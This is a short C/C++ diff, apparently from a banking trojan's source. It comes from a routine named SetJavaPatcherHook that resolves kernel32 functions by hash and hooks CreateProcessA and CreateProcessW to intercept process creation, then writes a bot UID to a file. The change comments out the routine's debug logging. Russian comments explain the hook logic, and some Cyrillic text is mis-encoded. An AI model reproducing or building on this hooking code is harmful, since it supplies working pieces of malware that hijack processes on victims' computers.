@@ -1278,20 +1278,20 @@ bool SetJavaPatcherHook()
 		resPatcher = data[0] - '0';
 		MemFree(data);
 	}
-	DBG( "JavaPatcher", "resPatcher = %d", resPatcher );
+//	DBG( "JavaPatcher", "resPatcher = %d", resPatcher );
 	bool ret = false;
 	if( resPatcher > 1 && resPatcher != 3 ) 
 	{
 		if (!HookApi( DLL_KERNEL32, 0x46318AC7, &HookCreateProcessA, &RealCreateProcA ) ) return false;
 		if (!HookApi( DLL_KERNEL32, 0x46318AD1, &HookCreateProcessW, &RealCreateProcW ) ) return false;
 		UID_To_File(BOT_UID);
-		DBG( "JavaPatcher", "’уки установлены" );
+//		DBG( "JavaPatcher", "’уки установлены" );
 		ret = true;
 	}
 	else
 	{
 		if( resPatcher == 1 ) ret = true; //патч был не полностью скачен, значит ставить хуки бесполезно, поэтому говорим об успешности
-		DBG( "JavaPatcher", "’уки не нужно ставить" );
+//		DBG( "JavaPatcher", "’уки не нужно ставить" );
 	}
 	return ret;
 }
